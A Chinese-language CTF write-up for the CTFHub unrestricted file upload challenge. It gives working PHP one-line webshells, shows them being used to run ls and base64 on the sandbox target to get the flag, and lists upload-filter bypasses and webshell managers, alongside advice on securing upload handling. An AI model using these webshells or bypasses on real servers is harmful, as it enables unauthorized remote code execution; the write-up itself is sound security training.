CTFHub 文件上传 - 无限制

2026年9月21日 CTFHub Web安全 文件上传 RCE

一、题目信息

  • 题目名称：文件上传 - 无限制
  • 题目平台：CTFHub 技能树
  • 题目类型：Web安全 / 文件上传漏洞 / 远程代码执行（RCE）
  • 靶场链接：http://challenge-xxxx.sandbox.ctfhub.com:10800/（动态环境）
  • 涉及工具：浏览器、中国蚁剑（可选）、Burp Suite（可选）

二、解题步骤

1. 分析题目考什么

本题的核心考点是无限制文件上传导致的远程代码执行（RCE）。题目名称中明确提示“无限制”，这意味着服务器端没有对上传文件的扩展名、MIME类型、文件内容进行任何过滤。解题者的核心任务是：上传一个 WebShell（PHP 木马），找到其存储路径，并通过传参执行系统命令，最终读取服务器上的 Flag 文件。

2. 怎么想（破题思路）

页面只有一个简单的文件上传表单。根据题目“无限制”的提示，可以直接断定后端未做任何校验。

  • 尝试上传一个普通的 .php 文件，由于没有过滤，必定能上传成功。
  • 上传成功后，页面会返回上传文件的相对路径（例如 upload/shell.php）。
  • 通过访问该路径，如果 PHP 代码被执行，我们就获得了服务器的控制权限。
  • 由于是黑盒测试，盲猜路径和传参方式常常导致失败，需要通过报错信息或抓包来修正路径。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：路径盲区与 404 Not Found

踩坑情况：上传成功后，直接访问 http://.../shell.php 或猜测访问 http://.../uploads/shell.php，页面均报 404 Not Found。

原因分析：CTF 靶机通常会将上传文件存放在特定的相对路径下。盲目猜测路径（如把 upload 拼写成 uploads）会导致找不到文件。

改进方式：上传成功后，必须留意页面的回显信息。一般在页面中会明确写出“上传文件相对路径：upload/shell.php”（注意这里是单数 upload）。直接拼接访问该路径即可。

踩坑记录二：环境过期导致“环境实例未找到”

踩坑情况：在本地写木马、调试的过程中，回头刷新页面，突然提示“环境已销毁，请重新开启题目环境”。

原因分析：CTFHub 靶场是按时间计费的沙盒环境（通常30分钟或1小时）。一旦超时，沙盒连同上传的木马都会被销毁。

改进方式：这种属于靶场机制问题。遇到这种情况不要慌，直接回到 CTFHub 题目面板点击“启动环境”，生成新的 URL 重新操作即可。操作时尽量连贯，避免无意义的长时间挂机。

踩坑记录三：木马无回显（GET 与 POST 的混淆）

踩坑情况：写了一个木马 <?php @eval($_POST['a']); ?>，上传后访问 .../upload/shell.php?cmd=ls，页面一片空白。

原因分析：木马中的 $_POST['a'] 说明它只能接收 POST 请求。浏览器直接输入 URL 回车发送的是 GET 请求，木马接收不到参数，自然无法执行。

改进方式：对于新手，为了便于在浏览器直接验证，建议改用 GET 木马：<?php system($_GET['cmd']); ?>。或者坚持用 POST 木马，但必须配合 Burp Suite 或中国蚁剑等工具发送 POST 请求。

终极解法：GET 木马的构造与使用

在本地新建文件 hack.php，写入以下代码：

<?php system($_GET['cmd']); ?>

代码逐字深度解析：

  • <?php：PHP 脚本的起始标记，告诉 Web 服务器从这里开始按 PHP 代码解析。
  • system：PHP 的内置函数，用于执行外部系统命令，并直接输出执行结果。
  • ( )：函数参数括号，里面的内容会作为命令传给 system 执行。
  • $_GET：PHP 超全局变量，用于接收 HTTP GET 请求中 URL 参数的数据。
  • [ 'cmd' ]：数组下标。表示提取 URL 中名为 cmd 的参数值。例如 URL 为 ?cmd=ls，则 $_GET['cmd'] 的值就是 ls。
  • ;：PHP 语句结束符。
  • ?>：PHP 脚本的结束标记。

具体执行流程：

  1. 将 hack.php 上传，获取路径 http://.../upload/hack.php。
  2. 执行 ls 查看当前目录：访问 http://.../upload/hack.php?cmd=ls，回显列出了文件列表。
  3. 访问上级目录寻找 Flag：访问 http://.../upload/hack.php?cmd=ls ../，发现了一个可疑文件 flag_127542770.php。
  4. 尝试读取 Flag：访问 http://.../upload/hack.php?cmd=cat ../flag_127542770.php，结果页面再次变为空白！

踩坑记录四：cat 读取 PHP 文件导致空白

踩坑情况：使用 cat 命令读取 flag 文件，没有报错，但页面不显示内容。

原因分析：Flag 文件的内容是 <?php // ctfhub{xxxx} ?>。当 Web 服务器解析这个 PHP 文件时，<?php 和 ?> 之间的内容被当作 PHP 代码处理。而 // 是 PHP 的单行注释符，后面的 Flag 内容被当作注释，不会输出给浏览器，因此我们看不到。

改进方式：使用 base64 命令将文件内容进行编码输出。Base64 编码后的字符串不再包含 <?php 等特殊字符，服务器就不会去解析它。

最终成功获取 Flag

执行命令：

http://.../upload/hack.php?cmd=base64 ../flag_127542770.php

页面回显了一串 Base64 字符串（如 PD9waHAgLy8gY3RmaHVi...）。将此字符串复制到任意在线 Base64 解码工具中解码，即可看到原本的 Flag 内容：

<?php // ctfhub{xxxxxxxxxxxx} ?>

提交 ctfhub{xxxx} 即可通关。

4. 怎么迁移（跨领域联想）

  • 真实渗透测试中的 WebShell 管理：在实战中，直接通过 URL 传参执行命令不仅效率低，而且容易在日志中留下明显的痕迹。攻击者通常会使用“中国蚁剑”或“冰蝎”这类 WebShell 管理工具，通过加密流量与服务器交互，实现文件管理、命令执行、数据库连接等操作。
  • 代码审计与安全开发：在代码审计中，如果发现代码中直接使用了 $_FILES 接收上传文件，且没有进行白名单后缀校验、MIME 校验、文件内容检测，就可以直接判定存在文件上传漏洞。安全开发必须遵循“白名单原则”，只允许上传特定格式的文件，并重命名文件、剥离执行权限。
  • Linux 命令行的灵活运用：本次实战中，从 ls 到 cat，再到 base64，体现了渗透测试中 Linux 命令的重要性。当遇到文件无法读取时，除了 base64，还可以使用 tac（反向读取）、nl（带行号读取）、cp（复制为 txt 读取）等替代命令。

三、名词大全与原理深度复盘

1. WebShell（网页木马）

WebShell 是一种以网页文件形式存在的后门工具。攻击者上传后，可以通过 HTTP 请求与服务器交互，执行系统命令、读取文件、提权等。本次使用的 hack.php 就是最简单的一句话木马。

2. HTTP GET 与 POST 的本质区别

GET 请求将参数附加在 URL 后面，具有长度限制，且参数暴露在地址栏、浏览器历史记录和服务器日志中。POST 请求将参数放在 HTTP 请求体中，没有长度限制，相对隐蔽。一句话木马通过 $_GET 或 $_POST 接收数据，必须对应正确的请求方式。

3. Web 服务器解析机制与文件上传漏洞的底层逻辑

当 Web 服务器（如 Apache、Nginx）接收到一个请求时，会根据文件的后缀名来决定如何处理。如果后缀是 .php，服务器会调用 PHP 解析器去执行这个文件。文件上传漏洞的底层逻辑在于：服务器允许用户上传任意文件（包括可执行脚本），并且该文件所在的目录具有被 Web 服务器解析执行的权限。这是导致 RCE（远程代码执行）的核心原因。

4. 为什么 cat 读 PHP 文件会空白，而 base64 可以？

PHP 解析器在执行文件时，会寻找 <?php 和 ?> 标记。标记之外的 HTML 内容会原样输出，标记之内的 PHP 代码会被执行。Flag 被写在 // 注释中，注释在 PHP 代码中是不参与输出的。而 base64 命令是 Linux 层面的文件读取命令，它不经过 PHP 解析器，直接将文件在磁盘上的原始二进制数据编码输出。因此，base64 可以完美绕过 PHP 解析机制，将包含 PHP 标签的原始文本完整地展示出来。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 SQL 注入对比：SQL 注入是攻击后端数据库，通过构造恶意 SQL 语句获取数据；而文件上传是直接向服务器植入可执行代码，获取的是服务器操作系统的控制权（RCE），危害级别更高。
  • 与 XSS 对比：XSS 的攻击对象是前端浏览器中的其他用户，需要用户交互才能触发（反射型）；文件上传的攻击对象是服务器本身，上传成功即可直接执行，无需等待管理员点击。
  • 与文件包含漏洞对比：文件包含是“借刀杀人”，利用服务器已有的包含功能去执行恶意文件；文件上传是“直接植入”，将恶意文件直接放在服务器上并请求执行。两者常组合使用（上传图片马 + 文件包含）。

2. 这种题目的出现原因（为什么存在）

这来源于开发者的安全意识缺失。在业务中，上传功能是刚需（如上传头像、附件、Excel）。开发者在实现功能时，往往只考虑了功能实现（用 move_uploaded_file 移动文件），而忽略了安全校验（没有限制后缀名、没有检查 MIME 类型、没有隔离静态文件目录）。在早期的 PHP 开发中，由于方便快捷，经常把上传文件和网页文件放在同一目录，甚至直接按照原文件名保存，导致攻击者上传 shell.php 后可直接访问执行。

3. 这种应用在实际中如何体现？

在真实的红蓝对抗（渗透测试）中，文件上传漏洞是获取权限的“一把利刃”。测试人员一旦发现上传点，会尝试绕过各种限制：

  • 前端绕过：修改前端 JS 验证，直接抓包修改后缀。
  • MIME 绕过：修改 Content-Type 为 image/jpeg 绕过类型检测。
  • 黑名单绕过：使用 php3、phtml、php5 或大小写混合（PhP）绕过。
  • 内容绕过：制作“图片马”，将 PHP 代码插入图片的二进制头部，配合文件包含漏洞或二次渲染漏洞执行。

4. 如何抽象理解概念（大白话理解）

把网站服务器比作一栋大楼：

  • 文件上传点：是大楼的“快递接收窗口”。
  • 无限制上传：是门卫不看快递里面装的是什么，只要有人送，他就直接收下并放到仓库里。
  • 上传木马：相当于攻击者把一个伪装成普通快递的“遥控炸弹”寄给了大楼，而门卫直接放行。
  • 访问木马路径：相当于攻击者走到仓库，按下了遥控器的开关（触发 PHP 解析）。
  • 环境过期：相当于大楼保安突然换班，把所有仓库里的东西都清空重置了，你手里的遥控器失效了。
  • base64 读取 Flag：就像是你找到了一个上锁的保险柜（PHP 文件），你直接用眼睛看（cat）会被锁挡住（PHP 解析），而 base64 命令就像是把整个保险柜整体打包带走，到了安全的地方（你的本地电脑）再撬开锁（解码），最终拿到了里面的宝物。

做一道题，就要往自己脑子里装点东西。
